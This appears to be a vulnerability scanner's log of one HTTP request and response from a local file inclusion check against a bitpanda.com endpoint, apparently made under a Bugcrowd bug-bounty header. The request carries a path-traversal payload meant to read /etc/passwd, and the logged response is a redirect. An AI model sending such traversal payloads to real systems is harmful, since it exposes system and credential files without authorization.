@@ -1,0 +1,26 @@
+[cpas-managment-lfi] Dumped HTTP request for https://techsolutions.bitpanda.com/cpasm4/plugInManController/downPlugs?fileId=../../../../etc/passwd&fileName
+
+
+GET /cpasm4/plugInManController/downPlugs?fileId=../../../../etc/passwd&fileName HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
+[cpas-managment-lfi] Dumped HTTP response https://techsolutions.bitpanda.com/cpasm4/plugInManController/downPlugs?fileId=../../../../etc/passwd&fileName
+
+HTTP/1.1 301 Moved Permanently
+Connection: close
+Date: Tue, 05 Aug 2025 12:53:24 GMT
+Location: ./downPlugs/?fileId=../../../../etc/passwd&fileName
+Via: 1.1 5087d38c8ed37f537ec0c78e2aeecec8.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: L7pTQIGnQ1H-dmQulCbO-N7lW1uuH3VgoQhc3s0nLRXiT_o2uvcggA==
+X-Amz-Cf-Pop: IAD55-P8
+X-Cache: LambdaGeneratedResponse from cloudfront
+Content-Length: 0
+
+
